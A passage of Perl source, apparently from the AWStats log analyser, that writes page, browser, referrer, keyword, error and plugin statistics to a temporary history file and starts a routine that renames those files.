{\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'PageShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# URL - Pages - Bandwidth - Entry - Exit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'PageShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SIDER${xmlbs}\"\n\t\t  . ( scalar keys %_url_p )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \\%_url_p,\n\t\t\t\\%_url_p );\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/([^:])\\/\\//$1\\//g\n\t\t\t  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_e{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_x{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_url_p ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/([^:])\\/\\//$1\\//g\n\t\t\t  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_e{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_x{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SIDER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'filetypes' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_FILETYPES${xmlbs}\"\n\t\t  . ( scalar keys %_filetypes_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_filetypes_h ) {\n\t\t\tmy $hits        = $_filetypes_h{$_}      || 0;\n\t\t\tmy $bytes       = $_filetypes_k{$_}      || 0;\n\t\t\tmy $bytesbefore = $_filetypes_gz_in{$_}  || 0;\n\t\t\tmy $bytesafter  = $_filetypes_gz_out{$_} || 0;\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$hits${xmlrs}$bytes${xmlrs}$bytesbefore${xmlrs}$bytesafter${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_FILETYPES${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'downloads' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Downloads - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DOWNLOADS${xmlbs}\"\n\t\t  . ( scalar keys %_downloads )\n\t\t  . \"${xmlbe}\\n\";\n\t\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($u)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0)\n\t\t\t  .\"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0)\n\t\t\t  .\"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_DOWNLOADS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'os' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# OS ID - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_OS ID - Hits - Pages${xmlbs}\"\n\t\t  . ( scalar keys %_os_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_os_h ) {\n\t\t\tmy $hits        = $_os_h{$_}      || 0;\n\t\t\tmy $pages       = $_os_p{$_}      || 0;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_OS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'browser' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Browser ID - Hits - Pages\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_BROWSER${xmlbs}\"\n\t\t  . ( scalar keys %_browser_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_browser_h ) {\n\t\t\tmy $hits        = $_browser_h{$_}      || 0;\n\t\t\tmy $pages       = $_browser_p{$_}      || 0;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_BROWSER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'screensize' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Screen size - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SCREENSIZE${xmlbs}\"\n\t\t  . ( scalar keys %_screensize_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_screensize_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$_screensize_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SCREENSIZE${xmlee}\\n\";\n\t}\n\n\t# Referer\n\tif ( $sectiontosave eq 'unknownreferer' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Unknown referer OS - Last visit date\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_UNKNOWNREFERER${xmlbs}\"\n\t\t  . ( scalar keys %_unknownreferer_l )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_unknownreferer_l ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t  . \"${xmlrs}$_unknownreferer_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_UNKNOWNREFERER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'unknownrefererbrowser' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Unknown referer Browser - Last visit date\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_UNKNOWNREFERERBROWSER${xmlbs}\"\n\t\t  . ( scalar keys %_unknownrefererbrowser_l )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_unknownrefererbrowser_l ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t  . \"${xmlrs}$_unknownrefererbrowser_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_UNKNOWNREFERERBROWSER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'origin' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Origin - Pages - Hits \\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ORIGIN${xmlbs}6\" . \"${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From0${xmlrs}\"\n\t\t  . int( $_from_p[0] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[0] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From1${xmlrs}\"\n\t\t  . int( $_from_p[1] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[1] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From2${xmlrs}\"\n\t\t  . int( $_from_p[2] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[2] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From3${xmlrs}\"\n\t\t  . int( $_from_p[3] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[3] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From4${xmlrs}\"\n\t\t  . int( $_from_p[4] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[4] )\n\t\t  . \"${xmlre}\\n\";    # Same site\n\t\tprint HISTORYTMP \"${xmlrb}From5${xmlrs}\"\n\t\t  . int( $_from_p[5] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[5] )\n\t\t  . \"${xmlre}\\n\";    # News\n\t\tprint HISTORYTMP \"${xmleb}END_ORIGIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'sereferrals' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search engine referers ID - Pages - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SEREFERRALS${xmlbs}\"\n\t\t  . ( scalar keys %_se_referrals_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_se_referrals_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_se_referrals_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_se_referrals_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SEREFERRALS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'pagerefs' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RefererShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# External page referers - Pages - Hits\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'RefererShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_PAGEREFS${xmlbs}\"\n\t\t  . ( scalar keys %_pagesrefs_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'}, $MinHit{'Refer'},\n\t\t\t\\%_pagesrefs_h,           \\%_pagesrefs_p\n\t\t);\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/^http(s|):\\/\\/([^\\/]+)\\/$/http$1:\\/\\/$2/i\n\t\t\t  ; # Remove / at end of http://.../ but not at end of http://.../dir/\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_pagesrefs_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_pagesrefs_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_pagesrefs_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/^http(s|):\\/\\/([^\\/]+)\\/$/http$1:\\/\\/$2/i\n\t\t\t  ; # Remove / at end of http://.../ but not at end of http://.../dir/\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_pagesrefs_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_pagesrefs_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_PAGEREFS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'searchwords' ) {\n\n\t\t# Save phrases section\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'KeyphrasesShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search keyphrases - Number of search\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'KeyphrasesShown'} first number of search must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SEARCHWORDS${xmlbs}\"\n\t\t  . ( scalar keys %_keyphrases )\n\t\t  . \"${xmlbe}\\n\";\n\n\t\t# We will also build _keywords\n\t\t%_keywords = ();\n\n# We save key list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keyphrases, \\%_keyphrases );\n\t\t%keysinkeylist = ();\n\t\tforeach my $key (@keylist) {\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $keyphrase = $key;\n\t\t\t$keyphrase =~ tr/ /\\+/s;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyphrase)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keyphrases{$key}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t\tforeach ( split( /\\+/, $key ) ) {\n\t\t\t\t$_keywords{$_} += $_keyphrases{$key};\n\t\t\t}    # To init %_keywords\n\t\t}\n\t\tforeach my $key ( keys %_keyphrases ) {\n\t\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\t\tmy $keyphrase = $key;\n\t\t\t$keyphrase =~ tr/ /\\+/s;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyphrase)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keyphrases{$key}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t\tforeach ( split( /\\+/, $key ) ) {\n\t\t\t\t$_keywords{$_} += $_keyphrases{$key};\n\t\t\t}    # To init %_keywords\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SEARCHWORDS${xmlee}\\n\";\n\n\t\t# Now save keywords section\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='keywords'><sortfor>$MaxNbOf{'KeywordsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search keywords - Number of search\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'KeywordsShown'} first number of search must be first (order not required for others)\\n\";\n\t\t$ValueInFile{\"keywords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_KEYWORDS${xmlbs}\"\n\t\t  . ( scalar keys %_keywords )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save key list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keywords, \\%_keywords );\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $keyword = $_;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyword)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keywords{$_}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_keywords ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $keyword = $_;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyword)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keywords{$_}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_KEYWORDS${xmlee}\\n\";\n\n\t}\n\n\t# Other - Errors\n\tif ( $sectiontosave eq 'cluster' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Cluster ID - Pages - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_CLUSTER${xmlbs}\"\n\t\t  . ( scalar keys %_cluster_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_cluster_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_cluster_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_cluster_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_cluster_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_CLUSTER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'misc' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Misc ID - Pages - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_MISC${xmlbs}\"\n\t\t  . ( scalar keys %MiscListCalc )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %MiscListCalc ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_misc_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_misc_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_misc_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_MISC${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'errors' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Errors - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ERRORS${xmlbs}\"\n\t\t  . ( scalar keys %_errors_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_errors_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$_errors_h{$_}${xmlrs}\"\n\t\t\t  . int( $_errors_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_ERRORS${xmlee}\\n\";\n\t}\n\n\t# Other - Trapped errors\n\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\tif ( $sectiontosave eq \"sider_$code\" ) {\n\t\t\tprint HISTORYTMP \"\\n\";\n\t\t\tif ($xml) {\n\t\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# URL with $code errors - Hits\"\n\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /R/i ? \" - Last URL referrer\" : '')\n\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /H/i ? \" - Host\" : '')\n\t\t\t  . \"\\n\";\n\n\t\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SIDER_$code${xmlbs}\"\n\t\t\t  . ( scalar keys %{$_sider_h{$code}} )\n\t\t\t  . \"${xmlbe}\\n\";\n\t\t\tforeach ( keys %{$_sider_h{$code}} ) {\n\t\t\t\tmy $newkey = $_;\n\t\t\t\tmy $newreferer = $_referer_h{$code}{$_} || '';\n\t\t\t\tmy $newhost = $_err_host_h{$code}{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t\t  . \"${xmlrs}$_sider_h{ $code }{$_}\"\n\t\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /R/i ? \"${xmlrs}\" . XMLEncodeForHisto($newreferer) : '')\n\t\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /H/i ? \"${xmlrs}\" . XMLEncodeForHisto($newhost) : '')\n\t\t\t\t  . \"${xmlre}\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP \"${xmleb}END_SIDER_$code${xmlee}\\n\";\n\t\t}\n\t}\n\n\t# Other - Extra stats sections\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tif ( $sectiontosave eq \"extra_$extranum\" ) {\n\t\t\tprint HISTORYTMP \"\\n\";\n\t\t\tif ($xml) {\n\t\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOfExtra[$extranum]</sortfor><comment>\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# Extra key - Pages - Hits - Bandwidth - Last access\\n\";\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# The $MaxNbOfExtra[$extranum] first number of hits are first\\n\";\n\t\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EXTRA_$extranum${xmlbs}\"\n\t\t\t  . scalar( keys %{ '_section_' . $extranum . '_h' } )\n\t\t\t  . \"${xmlbe}\\n\";\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t);\n\t\t\t%keysinkeylist = ();\n\t\t\tforeach (@keylist) {\n\t\t\t\t$keysinkeylist{$_} = 1;\n\t\t\t\tmy $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;\n\t\t\t\tmy $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;\n\t\t\t\tmy $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t\t  . \"${xmlrs}$page${xmlrs}\",\n\t\t\t\t  ${ '_section_' . $extranum . '_h' }{$_},\n\t\t\t\t  \"${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\\n\";\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t\tmy $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;\n\t\t\t\tmy $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;\n\t\t\t\tmy $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t\t  . \"${xmlrs}$page${xmlrs}\",\n\t\t\t\t  ${ '_section_' . $extranum . '_h' }{$_},\n\t\t\t\t  \"${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\\n\";\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tprint HISTORYTMP \"${xmleb}END_EXTRA_$extranum${xmlee}\\n\";\n\t\t}\n\t}\n\n\t# Other - Plugin sections\n\tif ( $AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\\w+)$/i ) {\n\t\tmy $pluginname = $1;\n\t\tif ( $PluginsLoaded{'SectionInitHashArray'}{\"$pluginname\"} ) {\n\n#   \t\tmy $function=\"SectionWriteHistory_$pluginname(\\$xml,\\$xmlbb,\\$xmlbs,\\$xmlbe,\\$xmlrb,\\$xmlrs,\\$xmlre,\\$xmleb,\\$xmlee)\";\n#  \t\t    eval(\"$function\");\n\t\t\tmy $function = \"SectionWriteHistory_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t$xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,\n\t\t\t\t$xmlrs, $xmlre, $xmleb, $xmlee\n\t\t\t);\n\t\t}\n\t}\n\n\t%keysinkeylist = ();\n}\n\n#--------------------------------------------------------------------\n# Function:     Rename all tmp history file into history\n# Parameters:   None\n# Input:        $DirData $PROG $FileSuffix\n#               $KeepBackupOfHistoricFile $SaveDatabaseFilesWithPermissionsForEveryone\n# Output:       None\n# Return:       1 Ok, 0 at least one error (tmp files are removed)\n#--------------------------------------------------------------------\nsub Rename_All_Tmp_History {\n\tmy $pid      = $$;\n\tmy $renameok = 1;\n\n\tif ($Debug) {\n\t\tdebug(\"Call to Rename_All_Tmp_History (FileSuffix=$FileSuffix)\");\n\t}\n\n\topendir( DIR, \"$DirData\" );\n\n\tmy $datemask;\n\tif    ( $DatabaseBreak eq 'month' ) { $datemask = '\\d\\d\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'year' )  { $datemask = '\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'day' )   { $datemask = '\\d\\d\\d\\d\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d'; }\n\tif ($Debug) {\n\t\tdebug(\n\"Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'\"\n\t\t);\n\t}\n\n\tmy $regfilesuffix = quotemeta($FileSuffix);\n\tforeach ( grep /^$PROG($datemask)$regfilesuffix\\.tmp\\.$pid$/,\n\t\tfile_filt sort readdir DIR )\n\t{\n\t\t/^$PROG($datemask)$regfilesuffix\\.tmp\\.$pid$/;\n\t\tif ($renameok) {    # No rename error yet\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Rename new tmp history file $PROG$1$FileSuffix.tmp.$$ into $PROG$1$FileSuffix.txt\",\n\t\t\t\t\t1\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( -s \"$DirData/$PROG$1$FileSuffix.tmp.$$\" )\n\t\t\t{               # Rename tmp files if size > 0\n\t\t\t\tif ($KeepBackupOfHistoricFiles) {\n\t\t\t\t\tif ( -s \"$DirData/$PROG$1$FileSuffix.txt\" )\n\t\t\t\t\t{       # History file already exists. 